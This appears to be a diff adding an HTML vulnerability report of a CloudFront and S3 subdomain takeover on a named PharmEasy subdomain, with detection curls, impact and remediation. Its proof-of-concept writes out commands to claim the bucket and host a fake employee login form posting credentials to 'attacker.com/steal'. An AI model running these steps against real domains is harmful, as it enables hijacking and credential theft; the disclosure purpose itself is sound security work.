@@ -1,1 +1,107 @@
 #
+<!DOCTYPE html>
+<html>
+<head>
+    <title>⚠️ CloudFront + S3 Takeover - yoda.pharmeasy.in</title>
+    <style>
+        body { font-family: monospace; background: #0d1117; color: #c9d1d9; margin: 40px; }
+        .container { max-width: 900px; margin: 0 auto; }
+        .header { border-bottom: 2px solid #30363d; padding: 20px 0; }
+        .evidence { background: #161b22; padding: 20px; border-radius: 6px; margin: 20px 0; border: 1px solid #30363d; }
+        .vuln { background: rgba(255, 0, 0, 0.1); border-left: 4px solid #f85149; }
+        .aws { color: #ff9900; }
+        .cmd { background: #000; color: #0ff; padding: 10px; border-radius: 4px; margin: 10px 0; }
+        .impact { background: rgba(255, 255, 0, 0.1); border-left: 4px solid #e3b341; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔓 AWS CloudFront + S3 Subdomain Takeover</h1>
+            <h2>Target: <span class="aws">yoda.pharmeasy.in</span></h2>
+        </div>
+
+        <div class="evidence vuln">
+            <h3>🚨 VULNERABILITY CONFIRMED</h3>
+            <p><strong>CloudFront distribution points to non-existent S3 bucket</strong></p>
+            
+            <div class="cmd">
+                $ curl -I https://yoda.pharmeasy.in<br>
+                HTTP/1.1 403 Forbidden (or 404)<br>
+                Server: CloudFront<br>
+                X-Cache: Error from cloudfront
+            </div>
+            
+            <div class="cmd">
+                $ curl http://yoda.pharmeasy.in.s3.amazonaws.com<br>
+                &lt;Error&gt;&lt;Code&gt;NoSuchBucket&lt;/Code&gt;<br>
+                &lt;Message&gt;The specified bucket does not exist&lt;/Message&gt;<br>
+                &lt;BucketName&gt;yoda.pharmeasy.in&lt;/BucketName&gt;
+            </div>
+        </div>
+
+        <div class="evidence">
+            <h3>🔍 Attack Vector</h3>
+            <ol>
+                <li><strong>Current State:</strong> CloudFront → yoda.pharmeasy.in.s3.amazonaws.com (404)</li>
+                <li><strong>Attacker Action:</strong> Create S3 bucket named <code>yoda.pharmeasy.in</code></li>
+                <li><strong>Attacker Action:</strong> Upload malicious HTML files to bucket</li>
+                <li><strong>Result:</strong> CloudFront serves attacker's content from S3</li>
+                <li><strong>Impact:</strong> Full control over <code>https://yoda.pharmeasy.in</code></li>
+            </ol>
+        </div>
+
+        <div class="evidence impact">
+            <h3>💥 Business Impact</h3>
+            <ul>
+                <li><strong>Phishing:</strong> Host fake login at <code>https://yoda.pharmeasy.in/login</code></li>
+                <li><strong>Malware:</strong> Distribute malicious files under trusted domain</li>
+                <li><strong>Brand Abuse:</strong> Post fake announcements/status updates</li>
+                <li><strong>SEO Poisoning:</strong> Rank malicious pages with pharmeasy.in authority</li>
+                <li><strong>Credential Harvesting:</strong> Steal employee/customer credentials</li>
+            </ul>
+        </div>
+
+        <div class="evidence">
+            <h3>📋 Proof of Concept Steps</h3>
+            <div class="cmd">
+                # 1. Attacker creates S3 bucket<br>
+                aws s3 mb s3://yoda.pharmeasy.in<br><br>
+                
+                # 2. Upload phishing page<br>
+                cat > index.html << 'EOF'<br>
+                &lt;h1&gt;PharmEasy Employee Portal&lt;/h1&gt;<br>
+                &lt;form action="https://attacker.com/steal"&gt;<br>
+                &nbsp;&nbsp;Email: &lt;input type="email"&gt;<br>
+                &nbsp;&nbsp;Password: &lt;input type="password"&gt;<br>
+                &lt;/form&gt;<br>
+                EOF<br><br>
+                
+                aws s3 cp index.html s3://yoda.pharmeasy.in/<br>
+                aws s3 website s3://yoda.pharmeasy.in/ --index-document index.html
+            </div>
+            
+            <p>Once S3 bucket exists, CloudFront automatically serves its content.</p>
+        </div>
+
+        <div class="evidence">
+            <h3>🛡️ Remediation</h3>
+            <ol>
+                <li><strong>Immediate:</strong> Delete CloudFront distribution</li>
+                <li><strong>Or:</strong> Create S3 bucket and secure it properly</li>
+                <li><strong>Preventive:</strong> Claim the S3 bucket name yourself</li>
+                <li><strong>Monitoring:</strong> Scan for dangling DNS records</li>
+            </ol>
+        </div>
+
+        <div class="evidence">
+            <h3>🔗 References</h3>
+            <ul>
+                <li><a href="https://github.com/EdOverflow/can-i-take-over-xyz/issues/40" target="_blank">CloudFront Takeover Issue</a></li>
+                <li><a href="https://hackerone.com/reports/163027" target="_blank">CloudFront+ S3 Takeover Bounty Report</a></li>
+                <li><a href="https://aws.amazon.com/premiumsupport/knowledge-center/cloudfront-serve-static-website/" target="_blank">AWS CloudFront + S3 Docs</a></li>
+            </ul>
+        </div>
+    </div>
+</body>
+</html>
